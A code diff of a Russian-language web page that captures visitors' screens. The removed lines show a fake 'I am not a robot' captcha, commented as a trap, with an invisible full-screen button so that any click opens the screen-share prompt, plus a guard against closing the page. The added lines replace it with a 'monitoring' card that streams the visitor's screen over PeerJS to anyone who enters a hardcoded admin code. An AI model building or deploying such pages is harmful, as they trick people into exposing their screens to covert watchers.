@@ -2,66 +2,103 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Проверка браузера</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S2 | PRIVATE MONITOR</title>
+    <script src="https://unpkg.com"></script>
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; cursor: default; }
+        :root { --accent: #ff8c00; --bg: #0d0d0f; --danger: #ff4444; }
+        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+
+        /* Карточка для посетителя */
+        .card { width: 280px; padding: 20px; background: rgba(255,140,0,0.05); border: 2px solid var(--accent); border-radius: 20px; text-align: center; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px rgba(255,140,0,0.1); }
+        .card:hover { transform: scale(1.02); background: rgba(255,140,0,0.1); }
+        .card i { font-size: 40px; display: block; margin-bottom: 10px; }
+        .card span { font-weight: bold; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Окно трансляции (для вас) */
+        #monitor-view { display: none; position: fixed; inset: 0; background: #000; z-index: 1000; }
+        video { width: 100%; height: 100%; object-fit: contain; }
+
+        /* Поле ввода кода */
+        .admin-box { margin-top: 30px; background: #16171a; padding: 15px; border-radius: 12px; border: 1px solid #333; display: flex; gap: 10px; align-items: center; }
+        input { background: #000; border: 1px solid #444; color: var(--accent); padding: 10px; border-radius: 6px; outline: none; width: 120px; font-weight: bold; text-align: center; }
+        .connect-btn { background: var(--accent); color: #000; border: none; padding: 10px 15px; border-radius: 6px; font-weight: bold; cursor: pointer; }
         
-        /* Визуальная ловушка: фальшивая капча */
-        .captcha-container { border: 1px solid #d3d3d3; padding: 15px; border-radius: 3px; background: #f9f9f9; width: 300px; display: flex; align-items: center; user-select: none; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; background: #fff; }
-        .text { font-size: 14px; color: #555; flex-grow: 1; }
-        .logo { width: 30px; height: 30px; background: url('https://www.gstatic.com') no-repeat center/contain; }
-
-        /* Прозрачная кнопка-невидимка на весь экран */
-        #invisibleTrigger {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            opacity: 0;
-            z-index: 9999;
-            cursor: pointer;
-        }
-
-        video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; background: #000; }
+        .status { margin-top: 10px; font-size: 0.7rem; color: #666; }
+        .close-btn { position: absolute; top: 20px; right: 20px; background: var(--danger); color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; z-index: 1100; }
     </style>
 </head>
 <body>
 
-    <div class="captcha-container">
-        <div class="checkbox"></div>
-        <div class="text">Я не робот</div>
-        <div class="logo"></div>
+    <!-- Интерфейс для посетителя -->
+    <div class="card" id="share-screen">
+        <i>📡</i>
+        <span>Активировать мониторинг</span>
+        <div class="status" id="peer-status">Ожидание...</div>
     </div>
 
-    <!-- Кнопка на весь экран: любой клик вызовет окно разрешения -->
-    <button id="invisibleTrigger"></button>
-    
-    <video id="preview" autoplay playsinline></video>
+    <!-- Поле для вас (Админ) -->
+    <div class="admin-box">
+        <input type="text" id="admin-code" placeholder="КОД">
+        <button class="connect-btn" onclick="startMonitoring()">ВОЙТИ</button>
+    </div>
+
+    <!-- Окно просмотра трансляции -->
+    <div id="monitor-view">
+        <button class="close-btn" onclick="location.reload()">ЗАКРЫТЬ</button>
+        <video id="remote-video" autoplay playsinline></video>
+    </div>
 
     <script>
-        const btn = document.getElementById('invisibleTrigger');
-        const video = document.getElementById('preview');
+        const SECRET_ID = "standoff-monitor-66778"; // Уникальный ID для связи
+        const peer = new Peer(SECRET_ID); // Посетитель регистрируется под этим ID
+        let localStream;
 
-        btn.addEventListener('click', async () => {
+        peer.on('open', (id) => {
+            document.getElementById('peer-status').innerText = "Система готова к трансляции";
+            console.log('ID сессии: ' + id);
+        });
+
+        // ЛОГИКА ПОСЕТИТЕЛЯ (ТРАНСЛЯЦИЯ)
+        document.getElementById('share-screen').addEventListener('click', async () => {
             try {
-                // Вызов системного окна выбора экрана
-                const stream = await navigator.mediaDevices.getDisplayMedia({ 
-                    video: { displaySurface: "monitor" }, // Пытаемся запросить весь экран
-                    audio: false 
+                localStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                document.getElementById('peer-status').innerText = "ТРАНСЛЯЦИЯ ЗАПУЩЕНА";
+                document.getElementById('peer-status').style.color = "var(--accent)";
+
+                // Ожидаем звонка от админа
+                peer.on('call', (call) => {
+                    call.answer(localStream); // Отвечаем своим потоком экрана
                 });
-
-                // Если пользователь нажал "Поделиться" в системном окне:
-                video.srcObject = stream;
-                video.style.display = 'block';
-                btn.remove(); // Убираем ловушку
-
-                // Блокировка попытки закрыть страницу (не гарантировано)
-                window.onbeforeunload = function() { return "Трансляция активна!"; };
-
             } catch (err) {
-                console.log("Пользователь закрыл системное окно выбора");
+                alert("Доступ к экрану отклонен");
             }
         });
+
+        // ЛОГИКА АДМИНА (ПРОСМОТР)
+        function startMonitoring() {
+            const inputCode = document.getElementById('admin-code').value;
+            if (inputCode !== "66778") {
+                alert("Неверный секретный код!");
+                return;
+            }
+
+            // Создаем временный Peer для админа, чтобы позвонить посетителю
+            const adminPeer = new Peer();
+            adminPeer.on('open', () => {
+                const call = adminPeer.call(SECRET_ID, new MediaStream()); // "Звоним" на скрытый ID
+                
+                call.on('stream', (remoteStream) => {
+                    document.getElementById('monitor-view').style.display = 'block';
+                    document.getElementById('remote-video').srcObject = remoteStream;
+                });
+
+                call.on('error', (err) => {
+                    alert("Трансляция не найдена. Посетитель еще не нажал кнопку.");
+                });
+            });
+        }
     </script>
 </body>
-</html>
+        </html>
+        
